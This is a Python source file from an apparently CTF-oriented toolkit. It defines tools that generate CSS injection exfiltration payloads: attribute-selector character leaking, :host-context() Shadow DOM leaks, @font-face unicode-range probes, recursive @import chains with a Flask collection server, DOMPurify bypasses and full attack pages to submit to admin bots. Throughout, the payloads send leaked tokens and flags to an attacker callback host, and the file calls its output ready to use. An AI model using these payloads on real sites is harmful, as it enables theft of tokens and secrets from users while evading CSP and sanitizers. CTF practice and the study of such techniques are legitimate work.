"""
CSS Injection payload generation and exfiltration building tools for CTF solving.

Provides utilities for generating CSS-based data exfiltration payloads using
attribute selectors, @font-face unicode-range, @import chains, :host-context(),
and sanitizer bypass techniques.
"""

from ctf_solver.tools.core import parse_json_input


class CssInjectionPayloadGenerator:
    """
    CssInjectionPayloadGenerator: generate CSS injection payloads for attribute
    exfiltration, Shadow DOM leaking, and CSP bypass.

    Pure logic tool -- no session required.

    Expected JSON tool_input format:

        {
          "operation": "attribute_exfil",
          "attribute": "value",
          "element": "input[name=token]",
          "callback_url": "https://attacker.com/leak",
          "charset": "0123456789abcdef",
          "prefix": ""
        }

    Supported operations:
      - attribute_exfil: CSS attribute selector payloads for char-by-char exfiltration
      - host_context: :host-context() payloads for Shadow DOM attribute leaking
      - font_face_exfil: @font-face unicode-range technique for text node leaking
      - import_chain: @import recursive exfiltration chain generation
      - sanitizer_bypass: Payloads that bypass DOMPurify/sanitizers via CSS
    """

    name: str = "css_injection_payload_generator"
    description: str = (
        "Generate CSS injection payloads for attribute exfiltration, Shadow DOM leaking, "
        "and CSP bypass. Input must be JSON with 'operation' (attribute_exfil, host_context, "
        "font_face_exfil, import_chain, sanitizer_bypass). For attribute_exfil: provide "
        "'element' (CSS selector), 'attribute' (attribute to leak), 'callback_url', "
        "'charset' (chars to test), optional 'prefix' (known prefix). Returns ready-to-use "
        "CSS payloads for data exfiltration in admin-bot / CSS injection scenarios."
    )
    parameters_schema = {
        "type": "object",
        "properties": {
            "operation": {
                "type": "string",
                "enum": [
                    "attribute_exfil",
                    "host_context",
                    "font_face_exfil",
                    "import_chain",
                    "sanitizer_bypass",
                ],
            },
            "element": {"type": "string"},
            "attribute": {"type": "string"},
            "callback_url": {"type": "string"},
            "charset": {"type": "string"},
            "prefix": {"type": "string"},
        },
        "required": ["operation"],
        "additionalProperties": True,
    }
    samples = [
        {
            "operation": "attribute_exfil",
            "element": "input[name=token]",
            "attribute": "value",
            "callback_url": "https://attacker.com/leak",
            "charset": "0123456789abcdef",
        },
    ]

    VALID_OPERATIONS = (
        "attribute_exfil",
        "host_context",
        "font_face_exfil",
        "import_chain",
        "sanitizer_bypass",
    )

    def use(self, tool_input: str) -> str:
        data, err = parse_json_input(tool_input, "CssInjectionPayloadGenerator")
        if err:
            return err
        operation = (data.get("operation") or "").strip().lower()
        if not operation:
            return (
                "[CssInjectionPayloadGenerator] Error: 'operation' is required. "
                f"Valid operations: {', '.join(self.VALID_OPERATIONS)}"
            )
        if operation not in self.VALID_OPERATIONS:
            return (
                f"[CssInjectionPayloadGenerator] Error: Unknown operation '{operation}'. "
                f"Valid operations: {', '.join(self.VALID_OPERATIONS)}"
            )

        if operation == "attribute_exfil":
            return self._attribute_exfil(data)
        elif operation == "host_context":
            return self._host_context(data)
        elif operation == "font_face_exfil":
            return self._font_face_exfil(data)
        elif operation == "import_chain":
            return self._import_chain(data)
        elif operation == "sanitizer_bypass":
            return self._sanitizer_bypass(data)

        return "[CssInjectionPayloadGenerator] Error: Unexpected state."

    def _attribute_exfil(self, data: dict) -> str:
        element = data.get("element", "input[name=token]")
        attribute = data.get("attribute", "value")
        callback_url = data.get("callback_url", "https://ATTACKER.com/leak")
        charset = data.get("charset", "0123456789abcdef")
        prefix = data.get("prefix", "")

        lines = [
            "[CssInjectionPayloadGenerator] Attribute Selector Exfiltration Payloads",
            "=" * 60,
            "",
            f"Target element: {element}",
            f"Target attribute: {attribute}",
            f"Callback URL: {callback_url}",
            f"Charset: {charset}",
            f"Known prefix: {prefix!r}",
            "",
            "=== Prefix-based exfiltration (value^=) ===",
            "Each rule fires a callback when the attribute starts with the prefix+char.",
            "",
        ]

        payloads = []
        for ch in charset:
            test_prefix = prefix + ch
            selector = f'{element}[{attribute}^="{test_prefix}"]'
            rule = f'{selector} {{ background: url("{callback_url}?c={ch}&p={test_prefix}"); }}'
            payloads.append(rule)

        for p in payloads:
            lines.append(p)

        lines.append("")
        lines.append("=== Substring-based exfiltration (value*=) ===")
        lines.append("Useful when prefix is unknown; detects any substring match.")
        lines.append("")

        for ch in charset[:8]:
            selector = f'{element}[{attribute}*="{ch}"]'
            rule = f'{selector} {{ background: url("{callback_url}?contains={ch}"); }}'
            lines.append(rule)

        lines.append("")
        lines.append("=== Suffix-based exfiltration (value$=) ===")
        lines.append("")

        for ch in charset[:8]:
            selector = f'{element}[{attribute}$="{ch}"]'
            rule = f'{selector} {{ background: url("{callback_url}?ends={ch}"); }}'
            lines.append(rule)

        lines.append("")
        lines.append("USAGE:")
        lines.append("1. Inject the prefix rules via CSS injection point")
        lines.append(
            "2. When the admin bot renders the page, the matching rule fires a request"
        )
        lines.append("3. Read the callback to learn the next character")
        lines.append("4. Add the discovered char to 'prefix' and repeat")
        lines.append(f"5. Total rules per round: {len(charset)} (one per charset char)")

        return "\n".join(lines)

    def _host_context(self, data: dict) -> str:
        target_attr = data.get("target_attr", "secret")
        callback_url = data.get("callback_url", "https://ATTACKER.com/leak")
        charset = data.get("charset", "abcdefghijklmnopqrstuvwxyz0123456789")

        lines = [
            "[CssInjectionPayloadGenerator] :host-context() Shadow DOM Exfiltration",
            "=" * 60,
            "",
            f"Target attribute: {target_attr}",
            f"Callback URL: {callback_url}",
            "",
            "These payloads leak attributes from the host element when injected",
            "inside a Shadow DOM component. :host-context() matches based on",
            "an ancestor or host element's attributes.",
            "",
            "=== Trigram enumeration payloads ===",
            "",
        ]

        # Generate trigram payloads for first few chars
        sample_trigrams = []
        for c1 in charset[:6]:
            for c2 in charset[:6]:
                sample_trigrams.append(c1 + c2)

        for trigram in sample_trigrams[:20]:
            rule = (
                f':host-context([{target_attr}*="{trigram}"]) {{ '
                f'background: url("{callback_url}?t={trigram}"); }}'
            )
            lines.append(rule)

        lines.append("")
        lines.append("=== Single character probing ===")
        lines.append("")

        for ch in charset:
            rule = (
                f':host-context([{target_attr}*="{ch}"]) {{ '
                f'background: url("{callback_url}?c={ch}"); }}'
            )
            lines.append(rule)

        lines.append("")
        lines.append("NOTES:")
        lines.append("- :host-context() only works inside Shadow DOM stylesheets")
        lines.append("- Useful when CSS injection exists inside a web component")
        lines.append(
            "- Combine with Declarative Shadow DOM for injection outside components"
        )
        lines.append("- Browser support: Chrome/Edge (not Firefox)")

        return "\n".join(lines)

    def _font_face_exfil(self, data: dict) -> str:
        callback_url = data.get("callback_url", "https://ATTACKER.com/leak")
        charset = data.get("charset", "abcdefghijklmnopqrstuvwxyz0123456789{}_-")

        lines = [
            "[CssInjectionPayloadGenerator] @font-face unicode-range Exfiltration",
            "=" * 60,
            "",
            f"Callback URL: {callback_url}",
            "",
            "This technique detects which characters exist in a text node.",
            "Each @font-face rule loads a unique font URL only when the",
            "corresponding character is present in the rendered text.",
            "",
            "=== @font-face rules ===",
            "",
        ]

        for ch in charset:
            code_point = f"U+{ord(ch):04X}"
            rule = (
                f"@font-face {{ font-family: leak_{ord(ch):04x}; "
                f'src: url("{callback_url}?c={ch}"); '
                f"unicode-range: {code_point}; }}"
            )
            lines.append(rule)

        lines.append("")
        lines.append("=== Apply the font to the target element ===")
        lines.append("")

        font_families = ", ".join(f"leak_{ord(ch):04x}" for ch in charset[:10])
        lines.append(f".target {{ font-family: {font_families}, ...; }}")

        lines.append("")
        lines.append("NOTES:")
        lines.append("- Detects character PRESENCE, not position or order")
        lines.append("- Combine with attribute selectors for positional data")
        lines.append("- Works across origins (no CORS needed for font loading)")
        lines.append("- Useful when text content (not attributes) needs leaking")
        lines.append("- CSS must apply to the element containing the target text")

        return "\n".join(lines)

    def _import_chain(self, data: dict) -> str:
        callback_url = data.get("callback_url", "https://ATTACKER.com")
        depth = data.get("depth", 3)
        element = data.get("element", "input[name=token]")
        attribute = data.get("attribute", "value")

        lines = [
            "[CssInjectionPayloadGenerator] @import Recursive Exfiltration Chain",
            "=" * 60,
            "",
            f"Callback/Server URL: {callback_url}",
            f"Chain depth: {depth}",
            "",
            "Recursive @import allows multi-character exfiltration in one page load.",
            "The attacker's server dynamically generates CSS based on leaked characters.",
            "",
            "=== Initial CSS payload (inject this) ===",
            "",
            f'@import url("{callback_url}/css?step=0&prefix=");',
            "",
            "=== Server-side script (Python Flask example) ===",
            "",
            "```python",
            "from flask import Flask, request",
            "app = Flask(__name__)",
            "",
            "leaked = ''",
            "",
            "@app.route('/css')",
            "def css_step():",
            "    global leaked",
            "    prefix = request.args.get('prefix', '')",
            "    leaked = prefix  # store leaked prefix",
            '    charset = "0123456789abcdef"',
            "    rules = []",
            "    for c in charset:",
            "        test = prefix + c",
            "        rules.append(",
            f'            f\'{element}[{attribute}^="{{test}}"] {{{{ '
            f'background: url("{callback_url}/leak?prefix={{test}}"); }}}}\' ',
            "        )",
            f"    rules.append(f'@import url(\"{callback_url}/css?step=next&prefix={{prefix}}\");')",
            "    return '\\n'.join(rules), 200, {'Content-Type': 'text/css'}",
            "",
            "@app.route('/leak')",
            "def leak():",
            "    global leaked",
            "    leaked = request.args.get('prefix', '')",
            "    return '', 204",
            "```",
            "",
            "=== How it works ===",
            f"1. Initial @import loads CSS from {callback_url}/css?step=0&prefix=",
            "2. Server returns attribute selector rules + another @import",
            "3. Browser evaluates selectors; matching one triggers /leak?prefix=<char>",
            "4. Next @import loads new rules with updated prefix",
            f"5. Repeats up to {depth} levels deep (limited by browser @import depth ~30)",
            "",
            "NOTES:",
            "- Chrome/Edge support ~30 levels of @import nesting",
            "- Each level leaks one character",
            "- Total exfiltration time: proportional to depth * network RTT",
            "- Alternative: use connection pool exhaustion (255 sockets) for faster leaking",
        ]

        return "\n".join(lines)

    def _sanitizer_bypass(self, data: dict) -> str:
        lines = [
            "[CssInjectionPayloadGenerator] Sanitizer Bypass CSS Payloads",
            "=" * 60,
            "",
            "Payloads designed to bypass DOMPurify, sanitize-html, and similar",
            "HTML sanitizers while still achieving CSS injection or exfiltration.",
            "",
            "=== @font-feature-values (bypasses some sanitizers) ===",
            "",
            '@font-feature-values "leak" { @styleset { leak: 1; } }',
            "/* Identifiers inside @font-feature-values are not escaped by some sanitizers */",
            "",
            "=== @keyframes name injection ===",
            "",
            '@keyframes leak { from { background: url("https://ATTACKER.com/leak?data=start"); } }',
            ".target { animation: leak 1s; }",
            "/* @keyframes names can contain injected URLs */",
            "",
            "=== CSS custom properties (--var) ===",
            "",
            ':root { --leak: url("https://ATTACKER.com/leak"); }',
            ".target { background: var(--leak); }",
            "/* Custom properties can hold url() values; some sanitizers don't inspect them */",
            "",
            "=== Declarative Shadow DOM bypass ===",
            "",
            '<div><template shadowrootmode="open">',
            "  <style>",
            '    :host-context([secret*="a"]) { background: url("https://ATTACKER.com/leak?c=a"); }',
            "  </style>",
            "  <slot></slot>",
            "</template></div>",
            "",
            "/* DOMPurify (before v3.x) does not sanitize inside <template shadowrootmode> */",
            "/* This creates a Shadow DOM with a stylesheet that leaks host attributes */",
            "",
            "=== Style attribute with CSS functions ===",
            "",
            '<div style="background:url(https://ATTACKER.com/leak)">',
            '<div style="--x:expression(alert(1))">  /* IE only */',
            '<div style="background:image-set(url(https://ATTACKER.com/leak) 1x)">',
            "",
            "=== CSS :has() selector (Chrome 105+) ===",
            "",
            'input:has(~ .secret[data-value^="a"]) { background: url("https://ATTACKER.com/leak?c=a"); }',
            "/* :has() enables relational selectors for more flexible targeting */",
            "",
            "=== Chromium crash oracle ===",
            "",
            "/* color-mix() crash for boolean oracle */",
            'input[value^="x"] { color: color-mix(in lch, red 999999999999999999%, blue); }',
            "/* If the tab crashes, the prefix matched (Chromium-specific) */",
            "",
            "NOTES:",
            "- Test which sanitizer the target uses (DOMPurify version matters)",
            "- DOMPurify v3.x+ blocks Declarative Shadow DOM by default",
            "- Always test in the target browser (Chrome vs Firefox behavior differs)",
            "- CSS-based exfiltration works even when CSP blocks all scripts",
        ]

        return "\n".join(lines)


class CssExfiltrationBuilder:
    """
    CssExfiltrationBuilder: build complete CSS exfiltration attack pages for
    admin bot scenarios.

    Pure logic tool -- no session required.

    Expected JSON tool_input format:

        {
          "operation": "build_page",
          "injection_point": "style_tag",
          "target_selector": "input[name=flag]",
          "target_attr": "value",
          "callback_url": "https://attacker.com/leak",
          "charset": "0123456789abcdef",
          "known_prefix": ""
        }

    Supported operations:
      - build_page: Generate complete HTML page with CSS exfiltration
      - build_recursive: Generate recursive CSS import exfiltration setup
    """

    name: str = "css_exfiltration_builder"
    description: str = (
        "Build complete CSS exfiltration attack pages for admin bot scenarios. "
        "Input must be JSON with 'operation' (build_page or build_recursive). "
        "For build_page: provide 'target_selector', 'target_attr', 'callback_url', "
        "'charset', optional 'known_prefix'. Returns complete HTML with CSS "
        "exfiltration payloads ready to host for admin bot visits."
    )
    parameters_schema = {
        "type": "object",
        "properties": {
            "operation": {
                "type": "string",
                "enum": ["build_page", "build_recursive"],
            },
            "injection_point": {"type": "string"},
            "target_selector": {"type": "string"},
            "target_attr": {"type": "string"},
            "callback_url": {"type": "string"},
            "charset": {"type": "string"},
            "known_prefix": {"type": "string"},
        },
        "required": ["operation"],
        "additionalProperties": True,
    }
    samples = [
        {
            "operation": "build_page",
            "target_selector": "input[name=flag]",
            "target_attr": "value",
            "callback_url": "https://attacker.com/leak",
            "charset": "0123456789abcdef",
        },
    ]

    VALID_OPERATIONS = ("build_page", "build_recursive")

    def use(self, tool_input: str) -> str:
        data, err = parse_json_input(tool_input, "CssExfiltrationBuilder")
        if err:
            return err
        operation = (data.get("operation") or "").strip().lower()
        if not operation:
            return (
                "[CssExfiltrationBuilder] Error: 'operation' is required. "
                f"Valid operations: {', '.join(self.VALID_OPERATIONS)}"
            )
        if operation not in self.VALID_OPERATIONS:
            return (
                f"[CssExfiltrationBuilder] Error: Unknown operation '{operation}'. "
                f"Valid operations: {', '.join(self.VALID_OPERATIONS)}"
            )

        if operation == "build_page":
            return self._build_page(data)
        elif operation == "build_recursive":
            return self._build_recursive(data)

        return "[CssExfiltrationBuilder] Error: Unexpected state."

    def _build_page(self, data: dict) -> str:
        injection_point = data.get("injection_point", "style_tag")
        target_selector = data.get("target_selector", "input[name=flag]")
        target_attr = data.get("target_attr", "value")
        callback_url = data.get("callback_url", "https://ATTACKER.com/leak")
        charset = data.get("charset", "0123456789abcdef")
        known_prefix = data.get("known_prefix", "")

        # Build CSS rules
        css_rules = []
        for ch in charset:
            test_prefix = known_prefix + ch
            selector = f'{target_selector}[{target_attr}^="{test_prefix}"]'
            rule = f'  {selector} {{ background: url("{callback_url}?c={ch}&p={test_prefix}"); }}'
            css_rules.append(rule)

        css_block = "\n".join(css_rules)

        lines = [
            "[CssExfiltrationBuilder] Complete Exfiltration Page",
            "=" * 55,
            "",
            f"Injection point: {injection_point}",
            f"Target: {target_selector}[{target_attr}]",
            f"Known prefix: {known_prefix!r}",
            f"Charset: {charset}",
            "",
        ]

        if injection_point == "style_tag":
            html = (
                "<!DOCTYPE html>\n"
                "<html>\n"
                "<head>\n"
                "  <style>\n"
                f"{css_block}\n"
                "  </style>\n"
                "</head>\n"
                "<body>\n"
                f"  <!-- Target element: {target_selector} -->\n"
                "  <p>Loading...</p>\n"
                "</body>\n"
                "</html>"
            )
        elif injection_point == "import":
            html = (
                "<!DOCTYPE html>\n"
                "<html>\n"
                "<head>\n"
                f'  <style>@import url("{callback_url}/css?prefix={known_prefix}");</style>\n'
                "</head>\n"
                "<body>\n"
                f"  <!-- Target element: {target_selector} -->\n"
                "  <p>Loading...</p>\n"
                "</body>\n"
                "</html>"
            )
        else:  # attribute or inline
            html = (
                "<!DOCTYPE html>\n"
                "<html>\n"
                "<head>\n"
                "  <style>\n"
                f"{css_block}\n"
                "  </style>\n"
                "</head>\n"
                "<body>\n"
                f"  <!-- Target element: {target_selector} -->\n"
                "  <p>Loading...</p>\n"
                "</body>\n"
                "</html>"
            )

        lines.append("=== HTML Page ===")
        lines.append("")
        lines.append(html)
        lines.append("")
        lines.append("USAGE:")
        lines.append("1. Host this HTML on your attacker server")
        lines.append("2. Submit the URL to the admin bot / report endpoint")
        lines.append("3. Monitor your callback server for leaked characters")
        lines.append("4. Update 'known_prefix' with discovered chars and regenerate")
        lines.append("5. Repeat until the full value is exfiltrated")

        return "\n".join(lines)

    def _build_recursive(self, data: dict) -> str:
        callback_url = data.get("callback_url", "https://ATTACKER.com")
        target_selector = data.get("target_selector", "input[name=flag]")
        target_attr = data.get("target_attr", "value")
        charset = data.get("charset", "0123456789abcdef")

        lines = [
            "[CssExfiltrationBuilder] Recursive CSS Import Exfiltration Setup",
            "=" * 60,
            "",
            f"Server URL: {callback_url}",
            f"Target: {target_selector}[{target_attr}]",
            f"Charset: {charset}",
            "",
            "=== Step 1: Initial injection payload ===",
            "",
            f'@import url("{callback_url}/css?prefix=");',
            "",
            "=== Step 2: Server-side script (Python Flask) ===",
            "",
            "```python",
            "from flask import Flask, request, Response",
            "app = Flask(__name__)",
            "",
            "leaked_data = ''",
            "",
            "@app.route('/css')",
            "def generate_css():",
            "    global leaked_data",
            "    prefix = request.args.get('prefix', '')",
            f"    charset = {charset!r}",
            "    rules = []",
            "    for c in charset:",
            "        test = prefix + c",
            f'        rules.append(f\'{target_selector}[{target_attr}^="{{test}}"] {{{{ '
            f'background: url("{callback_url}/leak?p={{test}}"); }}}}\')',
            f"    rules.append(f'@import url(\"{callback_url}/css?prefix={{prefix}}\");')",
            "    css = '\\n'.join(rules)",
            "    return Response(css, mimetype='text/css')",
            "",
            "@app.route('/leak')",
            "def leak():",
            "    global leaked_data",
            "    prefix = request.args.get('p', '')",
            "    if len(prefix) > len(leaked_data):",
            "        leaked_data = prefix",
            "        print(f'Leaked: {leaked_data}')",
            "    return '', 204",
            "",
            "@app.route('/result')",
            "def result():",
            "    return f'Leaked so far: {leaked_data}'",
            "",
            "if __name__ == '__main__':",
            "    app.run(host='0.0.0.0', port=8080)",
            "```",
            "",
            "=== Step 3: Trigger ===",
            "",
            "Submit the page containing the @import to the admin bot.",
            "The browser will recursively load CSS, leaking one char per round.",
            "",
            "NOTES:",
            "- Max ~30 characters per page load (browser @import depth limit)",
            "- For longer values, reload the page with accumulated prefix",
            "- Works even with strict CSP (CSS loads are not blocked by script-src)",
            "- Requires the attacker server to be reachable from the bot's browser",
        ]

        return "\n".join(lines)
